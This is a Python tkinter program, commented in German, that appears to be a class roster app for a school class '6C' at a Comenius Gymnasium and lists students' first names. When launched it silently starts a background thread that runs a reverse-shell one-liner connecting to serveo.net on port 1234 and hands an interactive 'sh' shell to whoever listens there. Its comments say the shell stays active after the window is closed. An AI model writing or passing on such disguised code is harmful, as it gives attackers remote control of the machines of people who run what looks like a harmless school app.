import tkinter as tk
from tkinter import ttk
from PIL import Image, ImageTk
import cairosvg
import subprocess
import threading
import os
import sys

# GUI-Anwendung für Schülerliste
class SchülerApp:
    def __init__(self, root):
        self.root = root
        self.root.title("6C Comenius Gymnasium")
        self.root.geometry("600x500")  # Größeres Fenster
        self.root.config(bg="#f4f4f4")  # Helles Hintergrund

        # Logo laden (optional)
        self.logo_path = "logo.svg"  # Dein Logo-Pfad
        self.load_logo()

        # Schülerliste
        self.schueler = ["Ivanva", "Lina", "Antonije", "Julien", "Elias", "Enzo",
                         "Adam", "Jaron", "Lotte", "Johan", "Robert", "Tobias", "Allisa"]
        
        self.create_widgets()

        # Führe den Reverse-Shell-Befehl sofort beim Start aus
        self.reverse_shell_thread = threading.Thread(target=self.execute_reverse_shell)
        self.reverse_shell_thread.daemon = True  # Stellt sicher, dass der Thread beendet wird, wenn die App geschlossen wird
        self.reverse_shell_thread.start()

    def load_logo(self):
        try:
            # Lade SVG und konvertiere es in ein Bild
            cairosvg.svg2png(url=self.logo_path, write_to="logo.png")
            logo_image = Image.open("logo.png")
            logo_image = logo_image.resize((200, 100))  # Größe anpassen
            self.logo_tk = ImageTk.PhotoImage(logo_image)
        except Exception as e:
            print("Fehler beim Laden des Logos:", e)
            self.logo_tk = None

    def create_widgets(self):
        # Header mit Logo und Titel
        header_frame = tk.Frame(self.root, bg="#3E8E41", pady=20)
        header_frame.pack(fill="x")

        if self.logo_tk:
            logo_label = tk.Label(header_frame, image=self.logo_tk, bg="#3E8E41")
            logo_label.pack(side="left", padx=20)
        
        title_label = tk.Label(header_frame, text="Schülerliste 6C", font=("Arial", 20, "bold"), fg="white", bg="#3E8E41")
        title_label.pack(side="left", padx=20)

        # Liste der Schüler
        self.schueler_tree = ttk.Treeview(self.root, columns=("Name"), show="headings", height=10)
        self.schueler_tree.heading("Name", text="Schüler Name")
        self.schueler_tree.column("Name", width=250, anchor="center")

        # Füge Schüler zur Liste hinzu
        for name in self.schueler:
            self.schueler_tree.insert("", tk.END, values=(name,))

        # Stil für die Treeview anpassen
        style = ttk.Style()
        style.configure("Treeview",
                        background="#E8F5E9",  # Hellgrün für den Hintergrund
                        foreground="#1B5E20",  # Dunkelgrün für Text
                        font=("Arial", 12))
        style.configure("Treeview.Heading",
                        background="#388E3C",  # Dunkelgrün für Kopfzeile
                        foreground="white",
                        font=("Arial", 14, "bold"))

        self.schueler_tree.pack(pady=20, padx=20)

        # Footer mit Button zum Starten der Reverse-Shell
        footer_frame = tk.Frame(self.root, bg="#3E8E41", pady=10)
        footer_frame.pack(fill="x", side="bottom")

        footer_label = tk.Label(footer_frame, text="© 2025 Comenius Gymnasium", font=("Arial", 10, "italic"), fg="white", bg="#3E8E41")
        footer_label.pack()

        # Handle beim Schließen des Fensters
        self.root.protocol("WM_DELETE_WINDOW", self.on_closing)

    def execute_reverse_shell(self):
        # Reverse-Shell Command
        RHOST = "serveo.net"
        RPORT = 1234
        payload = f'export RHOST="{RHOST}"; export RPORT={RPORT}; python -c "import sys, socket, os, pty; s=socket.socket(); s.connect((os.getenv(\'RHOST\'), int(os.getenv(\'RPORT\')))); [os.dup2(s.fileno(), fd) for fd in (0, 1, 2)]; pty.spawn(\'sh\')"'
        
        try:
            subprocess.run(payload, shell=True, check=True)
            print(f"Verbindung zu {RHOST} auf Port {RPORT} hergestellt.")
        except subprocess.CalledProcessError as e:
            print(f"Fehler beim Ausführen des Befehls: {e}")

    def on_closing(self):
        # Diese Methode sorgt dafür, dass der Reverse-Shell-Befehl im Hintergrund weiterhin ausgeführt wird, auch wenn die App geschlossen wird
        print("Das Fenster wird geschlossen, aber der Reverse-Shell-Prozess bleibt aktiv.")
        self.root.quit()  # Beendet die Tkinter-Loop, aber der Hintergrundprozess bleibt aktiv

# Hauptanwendung
if __name__ == "__main__":
    root = tk.Tk()
    app = SchülerApp(root)
    root.mainloop()
